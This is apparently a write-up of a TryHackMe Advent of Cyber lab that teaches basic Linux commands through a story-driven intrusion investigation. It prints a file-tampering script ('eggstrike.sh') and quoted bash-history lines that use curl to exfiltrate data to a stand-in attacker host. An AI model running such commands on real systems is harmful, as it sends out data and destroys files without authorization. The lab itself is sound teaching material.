
# **# Linux CLI - Shells Bells**

# Advent of Cyber 2025

## Day 1 – Linux CLI: Shells Bells

![](assets/Pasted%20image%2020251207183552.png)

### Category: Linux Fundamentals

### Difficulty: Easy

# **Task 1**
## Overview

The first day introduces the Linux command-line interface. The story sets the scene with McSkidy facing King Malhare, who holds a USB scepter and stands beside a computer terminal. The goal of the day is to understand the basics of Linux commands, learn how the CLI is used in system administration, and prepare to uncover the mysteries ahead.

## Objective

The task is focused on learning foundational Linux commands and interacting with a remote machine through SSH. Before answering any challenge questions, users must connect to the provided VM and explore the environment using basic command-line tools.

## Connecting to the Machine

TryHackMe provides a connection card with instructions. For this room, the machine must be accessed using the split-screen option unless you are using your own VPN-connected machine.

For users connecting manually, these are the credentials that were provided:


![](assets/Pasted%20image%2020251207183642.png)


# **Task 2**


## Overview

This task introduces basic Linux CLI usage and how to navigate the filesystem to locate hidden files. The challenge walks through simple commands such as `echo`, `ls`, `cat`, and `cd`, building up to discovering a hidden guide file left by McSkidy.

---

## Running Basic Commands

The task begins by demonstrating simple commands to interact with the system.

### Echoing Text

The first command prints text back to the terminal:

```bash
echo "The Terminal is So Cool!"
```

### Listing Directory Contents

To view the files in the current directory:

```bash
ls
```

This reveals several items, including `README.txt`.

### Reading a File

To display the contents of the README:

```bash
cat README.txt
```

The file contains a message left by McSkidy, hinting at a hidden security guide.

---

## Navigating the Filesystem

The next step is to explore the directory structure and locate the missing guide.

### Checking Current Directory

You begin in McSkidy's home directory:

```bash
pwd
```

### Entering the Guides Directory

Move into the `Guides` directory:

```bash
cd Guides
```

List its contents:

```bash
ls
```

The directory appears empty at first glance.

---

## Discovering Hidden Files

Linux can hide files that begin with a dot. To list all files, including hidden ones, use:

```bash
ls -la
```

This reveals a hidden file named `.guide.txt`.

### Reading the Hidden Guide

To view its contents:

```bash
cat .guide.txt
```



![](assets/Pasted%20image%2020251207184910.png)


## Grepping the Logs

McSkidy’s hidden guide mentions the `/var/log/` directory. This location stores system logs, including authentication attempts, errors, and security-related events. Instead of scrolling through massive log files with `cat`, the efficient approach is to use `grep` to filter for specific strings.

### Navigating to the Log Directory

```bash
cd /var/log
ls
```

### Searching for Failed Login Attempts

```bash
grep "Failed password" auth.log
```

This reveals repeated failed login attempts on the `socmas` account coming from HopSec-related hosts. This indicates an active attempt to break into Wareville’s systems.


![](assets/Pasted%20image%2020251207185928.png)

---

## Finding Suspicious Files

With evidence of intrusion, the next task is to search the system for files that may have been planted by attackers. Linux provides the `find` command, allowing targeted searches based on filename, type, modification date, and more.

### Searching for Files Containing “egg”

```bash
find /home/socmas -name *egg*
```

This returns a suspicious script:

```
/home/socmas/2025/eggstrike.sh
```

---

## Analyzing the Eggstrike Script

Navigating into the directory and reading the script reveals the following:

### Displaying the File

```bash
cd /home/socmas/2025
cat eggstrike.sh
```

### Script Breakdown

```bash
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

**Analysis:**

- Lines starting with `#` are comments.
    
- `cat wishlist.txt | sort | uniq > /tmp/dump.txt`  
    Sorts the wishlist and removes duplicates, sending the cleaned list into `/tmp/dump.txt`.
    
- `rm wishlist.txt`  
    Deletes the original Christmas wishlist.
    
- `mv eastmas.txt wishlist.txt`  
    Replaces it with a fake EASTMAS wishlist.
    
- The attacker echoes threatening messages as each step succeeds.
    

This confirms the attackers tampered with system files to sabotage Christmas operations.

---

## Important CLI Symbols

|Symbol|Meaning|Example|
|---|---|---|
|`|`|Sends output of one command into another|
|`>` / `>>`|Output redirection. `>` overwrites, `>>` appends|`echo data > out.txt`|
|`&&`|Run next command only if previous succeeds|`grep "key" file && echo "Found"`|

These appear throughout the malicious script and are commonly used in shell scripting.

---

## Viewing the Tampered Wishlist

Using the VM browser, McSkidy’s replaced wishlist can be viewed at:

```
http://10.66.176.87:8080
```

This confirms the attacker's modifications.

---

## System Utilities

The challenge introduces a few useful system tools:

- `uptime` – Shows how long the system has been running
    
- `ip addr` – Shows network interfaces and IP addresses
    
- `ps aux` – Lists all active processes
    
- `cat /etc/shadow` – Shows hashed passwords (root-only)
    

### Attempting to Read Shadow File

```bash
cat /etc/shadow
```

Results in:

```
Permission denied
```

---

## Becoming the Root User

Only the root user can access sensitive system files. To switch accounts:

### Switching to Root

```bash
sudo su
```

### Confirming User

```bash
whoami
```

Output:

```
root
```

Returning to the original user can be done with:

```bash
exit
```

---

## Bash History

All users have a `.bash_history` file which logs previously-executed commands. This can reveal attacker activity.

### Checking Root’s History

```bash
cd /root
cat .bash_history
```

This contains suspicious commands such as:

```
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://...
```

These show that the attackers exfiltrated data from the system, confirming the compromise.


![](assets/Pasted%20image%2020251207190554.png)


---


## Conclusion

By working through the Linux CLI tasks, several things became clear about the state of the system and the attacker’s activity:

- The `/var/log/auth.log` file revealed repeated failed login attempts targeting the `socmas` account, all originating from HopSec systems.
    
- Using `find`, a malicious script named `eggstrike.sh` was discovered inside the `socmas` home directory.
    
- Analysis of the script confirmed that the attackers replaced the legitimate Christmas wishlist with a fake EASTMAS version and attempted to hide their tracks.
    
- Viewing the website confirmed the replacement of the original wishlist.
    
- Root account history showed data exfiltration attempts via `curl`, proving the attackers successfully accessed sensitive files and sent them to an external HopSec server.
    

Overall, the challenge demonstrated how attackers gained access, altered key files, and attempted to sabotage Christmas operations. The investigation highlighted essential Linux skills such as navigating directories, analyzing logs, reviewing suspicious scripts, understanding CLI operators, and checking user history. Day 1 sets the stage for uncovering the larger attack unfolding across Wareville.